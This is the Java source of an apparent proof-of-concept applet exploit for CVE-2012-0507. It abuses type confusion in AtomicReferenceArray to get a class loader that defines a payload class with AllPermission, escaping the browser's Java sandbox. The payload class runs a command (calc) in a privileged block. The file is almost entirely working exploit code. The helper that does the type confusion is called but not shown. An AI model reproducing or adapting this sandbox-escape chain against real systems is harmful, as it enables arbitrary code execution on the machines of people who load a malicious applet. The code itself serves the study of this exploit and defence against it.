/**
 * CVE-2012-0507
 *
 * Type confusion in AtomicReferenceArray
 *
 * Load additional classes through the original Class Loader [Bypasses Sandbox]
 */

import java.applet.*;
import java.awt.*;
import java.security.*;
import java.io.*;
import java.net.*;

class Command implements PrivilegedExceptionAction {
    public Command() {
        try {
            AccessController.doPrivileged(this);
        } catch (Exception e) {
            System.out.println(e);
        }
    }
    public Object run() throws Exception {
        System.out.println("About to run");
        Runtime.getRuntime().exec("calc");
        return null;
    }
}

class MyClassLoader extends ClassLoader {
    public static void loadPayload(MyClassLoader loader, InputStream in) {
        try {
            System.out.println("Prepared stream");
            byte[] buf = new byte[4096];
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            int bytes_read;
            while ((bytes_read=in.read(buf)) != -1) {
                baos.write(buf, 0, bytes_read);
            }
            System.out.println("Prepared stream");
            URL url = new URL("file:///");
            java.security.cert.Certificate[] certs = 
                new java.security.cert.Certificate[0];
            
            Permissions p = new Permissions();
            p.add(new AllPermission());
            
            ProtectionDomain pd = new ProtectionDomain(
                new CodeSource(url, certs), p
            );
            
            byte[] objCode = baos.toByteArray();
            Class command = loader.defineClass("Command", objCode, 0, objCode.length, pd);
            
            Command c = (Command)command.newInstance();
        } catch (Exception e) {
            System.out.println(e);
        }
    }
}

public class ExploitApplet extends Applet {
    public void init() {
        ClassLoader originalLoader = getClass().getClassLoader();
        System.out.println("Got original loader");
        MyClassLoader loader = Exploit.typeConfuse(originalLoader);
        System.out.println("Got confused loader");
        InputStream in = getClass().getResourceAsStream("Command.class");
        System.out.println("Got class");
        loader.loadPayload(loader, in);
    }
}
